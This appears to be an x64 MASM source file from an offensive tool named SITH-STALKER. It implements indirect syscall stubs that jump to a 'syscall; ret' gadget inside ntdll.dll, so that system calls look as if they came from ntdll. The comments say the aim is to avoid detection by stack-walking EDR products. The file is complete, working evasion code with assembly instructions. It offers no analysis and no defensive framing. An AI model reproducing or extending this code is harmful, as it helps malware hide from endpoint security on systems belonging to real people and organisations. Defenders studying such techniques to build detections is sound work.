;
; gate_stub.asm — Indirect Syscall Invocation Stubs (x64 MASM)
; ═══════════════════════════════════════════════════════════════════
; SITH-STALKER — 22DIV / george wu
;
; Two exported functions:
;   SetSyscall(ssn, gadget_addr)  — stores SSN and jump target
;   IndirectSyscall(...)          — performs the indirect syscall
;
; The key insight: instead of executing "syscall" from our own .text
; section (which stack-walking EDR would flag as anomalous), we JMP
; to the syscall;ret instruction INSIDE ntdll.dll's own code space.
;
; From the kernel's perspective (and any stack inspector), the syscall
; originated from ntdll.dll — exactly where it's expected to come from.
;
; ASSEMBLE:
;   ml64.exe /c src\gate_stub.asm /Fo:src\gate_stub.obj
;
; ═══════════════════════════════════════════════════════════════════

.data
    ; Global state set by SetSyscall before each IndirectSyscall call
    g_ssn           DWORD 0     ; System Service Number (loaded into EAX)
    g_syscall_addr  QWORD 0     ; Address of syscall;ret gadget in ntdll

.code

; ═══════════════════════════════════════════════════════════════════
; SetSyscall — prepare for next syscall invocation
; ═══════════════════════════════════════════════════════════════════
; RCX = SSN (DWORD)
; RDX = syscall gadget address (void *)
;
; Stores both into globals. Must be called immediately before
; IndirectSyscall (not thread-safe — one gate at a time).
; ═══════════════════════════════════════════════════════════════════

SetSyscall PROC
    mov g_ssn, ecx
    mov g_syscall_addr, rdx
    ret
SetSyscall ENDP

; ═══════════════════════════════════════════════════════════════════
; IndirectSyscall — execute syscall via ntdll gadget
; ═══════════════════════════════════════════════════════════════════
; Arguments: same as the target Nt* function.
;   RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
;   Stack args at [RSP+28h], [RSP+30h], etc.
;
; Sequence:
;   1. mov r10, rcx    — syscall convention (rcx clobbered by syscall)
;   2. mov eax, <SSN>  — System Service Number
;   3. jmp [gadget]    — jumps into ntdll's "syscall; ret" bytes
;
; After the kernel returns, execution hits the "ret" in ntdll,
; which returns to OUR caller. The call stack shows ntdll as the
; syscall origin — legitimate to any inspector.
; ═══════════════════════════════════════════════════════════════════

IndirectSyscall PROC
    mov r10, rcx                    ; save 1st arg (syscall clobbers rcx)
    mov eax, g_ssn                  ; load SSN
    jmp QWORD PTR g_syscall_addr    ; jump to syscall;ret in ntdll
    ; execution never reaches here — ntdll's "ret" returns to our caller
IndirectSyscall ENDP

END
